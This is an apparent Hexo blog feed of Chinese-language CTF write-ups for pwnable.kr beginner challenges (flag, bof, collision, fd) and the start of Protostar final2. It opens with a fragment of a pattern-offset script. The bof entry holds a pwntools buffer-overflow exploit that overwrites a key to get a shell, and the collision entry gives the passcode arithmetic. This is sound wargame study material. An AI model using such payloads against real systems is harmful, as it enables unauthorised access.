class="title">show_pattern</span><span class="params">(size)</span>:</span></span><br><span class="line">size = int(size)</span><br><span class="line">count = size // <span class="number">20280</span></span><br><span class="line">inc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> inc &lt; count:</span><br><span class="line">sys.stdout.write(buf)</span><br><span class="line">inc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">mod = size % <span class="number">20280</span></span><br><span class="line">sys.stdout.write(buf[:mod])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">offset = offset.replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = binascii.unhexlify(offset)</span><br><span class="line">offset = offset[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"hex pattern decoded as: "</span> + offset</span><br><span class="line"><span class="keyword">return</span> offset</span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line">sploit.show_error(<span class="string">"Invalid input offset."</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_offset</span><span class="params">(offset, size)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pos = buf.index(offset)</span><br><span class="line"><span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> pos</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">position = list()</span><br><span class="line">count = size // <span class="number">20280</span></span><br><span class="line">inc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> inc &lt; count:</span><br><span class="line">position.append(str(inc * <span class="number">20280</span> + pos))</span><br><span class="line">inc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">mod = size % <span class="number">20280</span></span><br><span class="line"><span class="keyword">if</span> pos + len(offset) &lt;= mod:</span><br><span class="line">position.append(str(inc * <span class="number">20280</span> + pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> os.linesep.join(position)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">offset = decode_offset(offset)</span><br><span class="line">show_offset(offset, size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">show_help()</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] != <span class="string">"create"</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] != <span class="string">"offset"</span>:</span><br><span class="line">show_help()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"create"</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>].isdigit():</span><br><span class="line">show_pattern(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">sploit.show_error(<span class="string">"You need to supply the &lt;int&gt; value for the create action."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"offset"</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">size = int(sys.argv[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">show_offset(sys.argv[<span class="number">2</span>], size)</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">sploit.show_error(<span class="string">"You need to supply the &lt;str&gt; value for the offset action."</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">sploit.show_error(<span class="string">"Keyboard interrupt received. Educated guess: the script took too long to execute. You used a really long size, didn't you?"</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ROP-linux-x86&quot;&gt;&lt;a href=&quot;#ROP-linux-x86&quot; class=&quot;headerlink&quot; title=&quot;ROP linux_x86&quot;&gt;&lt;/a&gt;ROP linux_x86&lt;/h1&gt;&lt;h2 id=&quot;Level-1-没有防御措施&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="http://yoursite.com/2019/08/30/flag/"/>
    <id>http://yoursite.com/2019/08/30/flag/</id>
    <published>2019-08-30T15:42:21.000Z</published>
    <updated>2019-08-31T16:18:49.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-Flag"><a href="#Toddler’s-Bottle-Flag" class="headerlink" title="Toddler’s Bottle Flag"></a>Toddler’s Bottle Flag</h1><p>直接上题目</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#39;s open it.</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure></div><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>先运行看看<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_1.png" data-fancybox="group" data-caption="flag_1" class="fancybox"><img alt="flag_1" title="flag_1" data-src="https://dblu3.github.io/img/pwnable.kr/flag_1.png" class="lazyload"></a></p><p>好像跟题目说的一样，是个单纯的逆向题</p><p>拖入IDA中，发现里面的函数太少，应该是加过壳的</p><p>再仔细找找，结果发现了upx字样，应该是upx壳<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_2.png" data-fancybox="group" data-caption="flag_2" class="fancybox"><img alt="flag_2" title="flag_2" data-src="https://dblu3.github.io/img/pwnable.kr/flag_2.png" class="lazyload"></a></p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upd -d flag -o flag_upx</span><br></pre></td></tr></table></figure></div><p>搞定<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_3.png" data-fancybox="group" data-caption="flag_3" class="fancybox"><img alt="flag_3" title="flag_3" data-src="https://dblu3.github.io/img/pwnable.kr/flag_3.png" class="lazyload"></a></p><h1 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h1><p>把脱壳后的文件继续拉入IDA里面，轻松找到了flag<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_4.png" data-fancybox="group" data-caption="flag_4" class="fancybox"><img alt="flag_4" title="flag_4" data-src="https://dblu3.github.io/img/pwnable.kr/flag_4.png" class="lazyload"></a></p><p>提交后发现不正确，应该是漏掉了什么</p><p>用Notepad++打开，搜索UPX，发现完整的flag  =。=<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_5.png" data-fancybox="group" data-caption="flag_5" class="fancybox"><img alt="flag_5" title="flag_5" data-src="https://dblu3.github.io/img/pwnable.kr/flag_5.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-Flag&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-Flag&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle Flag&quot;&gt;&lt;/a&gt;Toddler’s Bottle Flag&lt;/h1&gt;&lt;p&gt;直接上题目&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>BOF</title>
    <link href="http://yoursite.com/2019/08/26/BOF/"/>
    <id>http://yoursite.com/2019/08/26/BOF/</id>
    <published>2019-08-26T15:12:52.000Z</published>
    <updated>2019-08-31T16:24:04.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-BOF"><a href="#Toddler’s-Bottle-BOF" class="headerlink" title="Toddler’s Bottle BOF"></a>Toddler’s Bottle BOF</h1><p>直接看题目，主要是关于缓冲区溢出的</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>用IDA打开看看</p><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_1.png" data-fancybox="group" data-caption="bof_1" class="fancybox"><img alt="bof_1" title="bof_1" data-src="https://dblu3.github.io/img/pwnable.kr/bof_1.png" class="lazyload"></a></p><p>这时候我们注意到char s的位置是ebp-2ch</p><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_2.png" data-fancybox="group" data-caption="bof_2" class="fancybox"><img alt="bof_2" title="bof_2" data-src="https://dblu3.github.io/img/pwnable.kr/bof_2.png" class="lazyload"></a></p><p>那么当gets()函数获取s时，我们就可以通过缓冲区溢出获取”/bin/sh”</p><h1 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_3.png" data-fancybox="group" data-caption="bof_3" class="fancybox"><img alt="bof_3" title="bof_3" data-src="https://dblu3.github.io/img/pwnable.kr/bof_3.png" class="lazyload"></a></p><p>记得加上arg_0的8个字节<br>0x2c + 0x8 = 0x34 = 52</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>52个字节的padding + 0xcafebabe 就行了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>bof.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">52</span></span><br><span class="line">payload = padding + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_4.png" data-fancybox="group" data-caption="bof_4" class="fancybox"><img alt="bof_4" title="bof_4" data-src="https://dblu3.github.io/img/pwnable.kr/bof_4.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-BOF&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-BOF&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle BOF&quot;&gt;&lt;/a&gt;Toddler’s Bottle BOF&lt;/h1&gt;&lt;p&gt;直接看题目，主要是关于缓冲区溢出的&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Collision</title>
    <link href="http://yoursite.com/2019/08/25/Collision/"/>
    <id>http://yoursite.com/2019/08/25/Collision/</id>
    <published>2019-08-25T07:01:39.000Z</published>
    <updated>2019-08-26T16:16:20.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-Collision"><a href="#Toddler’s-Bottle-Collision" class="headerlink" title="Toddler’s Bottle Collision"></a>Toddler’s Bottle Collision</h1><p>Toddler’s Bottle 的第二道题，首先看下给出的题目给出的提示：这道题主要是关于MD5 Hash碰撞</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure></div><h1 id="登录查看"><a href="#登录查看" class="headerlink" title="登录查看"></a>登录查看</h1><p>发现了3个文件</p><p><a href="https://dblu3.github.io/img/pwnable.kr/col_1.png" data-fancybox="group" data-caption="col_1" class="fancybox"><img alt="col_1" title="col_1" data-src="https://dblu3.github.io/img/pwnable.kr/col_1.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>col.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>看源码就知道了，题目要求我们输入的20个字符转换成5个int类型的整数后相加的结果等于0x21DD09EC</p><p>这里需要注意的是strlen函数，我们输入的字符串不能包含0</p><p>简单换算下就行了</p><p>0x21DD09EC   = 568134124<br>0x21DD09EC/5 = 113626824.8<br>0x21DD09EC/5+0.2 = 0x6C5CEC9<br>0x6C5CEC9*5    = 568134125</p><p>相加之后多了1，那么把其中一个数减1，也就是改成0x6C5CEC8就行了</p><p>最后我们只要输入4个0x6C5CEC9+1个0x6C5CEC8就可以了</p><p>字节是从低位开始存储的，所以输入的时候记得换下顺序</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/col_2.png" data-fancybox="group" data-caption="col_2" class="fancybox"><img alt="col_2" title="col_2" data-src="https://dblu3.github.io/img/pwnable.kr/col_2.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-Collision&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-Collision&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle Collision&quot;&gt;&lt;/a&gt;Toddler’s Bottle Collision&lt;/h1&gt;&lt;p&gt;Toddler’s Bottle 的第二道题，首先看下给出的题目给出的提示：这道题主要是关于MD5 Hash碰撞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>FD</title>
    <link href="http://yoursite.com/2019/08/18/fd/"/>
    <id>http://yoursite.com/2019/08/18/fd/</id>
    <published>2019-08-18T10:57:24.000Z</published>
    <updated>2019-08-31T16:17:02.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于Pwnable-kr"><a href="#关于Pwnable-kr" class="headerlink" title="关于Pwnable.kr"></a>关于Pwnable.kr</h1><blockquote><p><a href="https://pwnable.kr/index.php" target="_blank" rel="noopener">pwnable.kr</a>是一个wargame site，提供了各种难度的pwn题供大家学习和挑战</p></blockquote><a id="more"></a><h1 id="Toddler’s-Bottle-FD"><a href="#Toddler’s-Bottle-FD" class="headerlink" title="Toddler’s Bottle FD"></a>Toddler’s Bottle FD</h1><p>Toddler’s Bottle是pwnable.kr里面难度最低的，这次做的是第一题fd</p><p>首先点开题目，发现作者给出了提示，这道题应该是关于linux文件描述符的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:&#x2F;&#x2F;youtu.be&#x2F;971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure></div><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/fd_1.png" data-fancybox="group" data-caption="fd_1" class="fancybox"><img alt="fd_1" title="fd_1" data-src="https://dblu3.github.io/img/pwnable.kr/fd_1.png" class="lazyload"></a></p><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/fd_2.png" data-fancybox="group" data-caption="fd_2" class="fancybox"><img alt="fd_2" title="fd_2" data-src="https://dblu3.github.io/img/pwnable.kr/fd_2.png" class="lazyload"></a><br>发现flag文件，但是我们没有权限查看，但是我们有fd这个文件的执行权限</p><p>话虽如此，但还是要尝试一下能不能授权=。=<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_3.png" data-fancybox="group" data-caption="fd_3" class="fancybox"><img alt="fd_3" title="fd_3" data-src="https://dblu3.github.io/img/pwnable.kr/fd_3.png" class="lazyload"></a><br>果然不行- -</p><p>还是老老实实看下fd.c的内容吧<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_4.png" data-fancybox="group" data-caption="fd_4" class="fancybox"><img alt="fd_4" title="fd_4" data-src="https://dblu3.github.io/img/pwnable.kr/fd_4.png" class="lazyload"></a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>提示了让我们去学Linux file IO~</p><p>如果你不懂这部分的知识，那就老老实实地去学一遍吧=。=</p><p>其实挺简单的<br>fd = 0：标准输入<br>fd = 1：标准输出<br>fd = 2：标准错误输出</p><p>再结合fd.c里面的内容看，已经很明显了<br>就是让fd=0，然后我们输入LETMEWIN，他就会输出flag了~</p><p>那么如何让fd=0呢？<br>我们注意到这行</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>]) - <span class="number">0x1234</span>);</span><br></pre></td></tr></table></figure></div><p>那么我们只要提供10进制的参数-0x1234就能使fd=0了<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_5.png" data-fancybox="group" data-caption="fd_5" class="fancybox"><img alt="fd_5" title="fd_5" data-src="https://dblu3.github.io/img/pwnable.kr/fd_5.png" class="lazyload"></a></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>成功拿到flag<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_6.png" data-fancybox="group" data-caption="fd_6" class="fancybox"><img alt="fd_6" title="fd_6" data-src="https://dblu3.github.io/img/pwnable.kr/fd_6.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于Pwnable-kr&quot;&gt;&lt;a href=&quot;#关于Pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;关于Pwnable.kr&quot;&gt;&lt;/a&gt;关于Pwnable.kr&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://pwnable.kr/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnable.kr&lt;/a&gt;是一个wargame site，提供了各种难度的pwn题供大家学习和挑战&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final2</title>
    <link href="http://yoursite.com/2018/09/25/Protostar-final2/"/>
    <id>http://yoursite.com/2018/09/25/Protostar-final2/</id>
    <published>2018-09-25T03:51:34.000Z</published>
    <updated>2018-09-25T10:46:14.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final2"><a href="#Final2" class="headerlink" title="Final2"></a>Final2</h1><p>Final2: Protostar系列的最后一题了</p><a id="more"></a><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/malloc.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2993</span></span><br><span 